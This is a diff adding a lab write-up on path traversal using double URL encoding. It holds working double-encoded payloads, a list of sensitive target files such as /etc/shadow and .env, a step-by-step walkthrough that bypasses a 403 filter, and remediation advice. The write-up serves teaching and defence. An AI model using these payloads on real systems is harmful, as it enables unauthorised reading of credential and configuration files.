@@ -577,3 +577,105 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 ✔ Log abnormal file access attempts  
 
 ---
+
+# 🔥Lab-4 **DOUBLE URL ENCODING TRAVERSAL — WRITE-UP**
+
+---
+
+## 📌 **ONE-LINE SUMMARY**
+Double URL Encoding was used to bypass path-traversal filters and access restricted server files such as `/etc/passwd`.
+
+---
+
+## 📘 **WHAT IS DOUBLE URL ENCODING?**
+Double URL Encoding is when characters like `.` and `/` are encoded twice:
+- First encode → `%2e`
+- Second encode → `%252e`
+
+Servers often decode only once, allowing traversal sequences to slip through.
+
+---
+
+## 🎯 **WHY THIS MATTERS**
+- Bypasses WAF rules  
+- Bypasses blacklist filters  
+- Allows reading sensitive files  
+- Common in poorly validated file-fetch endpoints  
+- Attackers can escalate to full system compromise
+
+---
+
+## 🌍 **REAL-WORLD SCENARIOS**
+- 🔸 Old PHP backends decoding only once  
+- 🔸 Node.js servers using decodeURIComponent twice  
+- 🔸 Java File() API resolving paths even after filtering  
+- 🔸 Legacy CMS plugins vulnerable to traversal bypass  
+- 🔸 CTF & Bug Bounty endpoints fetching internal resources
+
+---
+
+## 💥 **COMMON DOUBLE-ENCODED PAYLOADS**
+```
+%252e%252e%252f
+%252e%252e%255c
+..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252fwindows/win.ini
+../../%252e%252e%252fetc/passwd
+```
+
+---
+
+## 🏴‍☠️ **HIGH-VALUE ENDPOINTS ATTACKERS TARGET**
+```
+/etc/passwd
+/etc/shadow
+/var/www/html/config.php
+/var/www/html/.env
+/windows/win.ini
+/app/logs/error.log
+/var/lib/mysql/*.frm
+```
+
+---
+
+## 🧪 **LAB WALKTHROUGH**
+
+### **🔹 Step 1 — Identify vulnerable endpoint**
+```
+GET /image?file=cat.png
+```
+
+### **🔹 Step 2 — Test single traversal (BLOCKED)**
+```
+GET /image?file=../../etc/passwd
+→ 403 Forbidden
+```
+
+### **🔹 Step 3 — Apply double-encoded traversal**
+Payload:
+```
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+### **🔹 Step 4 — Server decodes ONCE → sees %2e%2e/**
+### **🔹 Step 5 — Server decodes SECOND time internally → becomes ../**
+### **🔹 Step 6 — File successfully read**
+Lab is solved.
+
+---
+
+## 📸 **EVIDENCE (SCREENSHOTS)**
+
+![Decoded Payload Evidence](../images/double-url-encoding.png)
+
+---
+
+## 🛡 **REMEDIATION**
+- ❌ Do NOT rely on blacklists  
+- ❌ Do NOT decode user input automatically  
+- ✔ Apply **canonicalization** before validation  
+- ✔ Restrict file access to allow-listed directories only  
+- ✔ Use framework-level safe file-path handlers  
+- ✔ Apply WAF rules for encoded traversal attempts  
+
+---
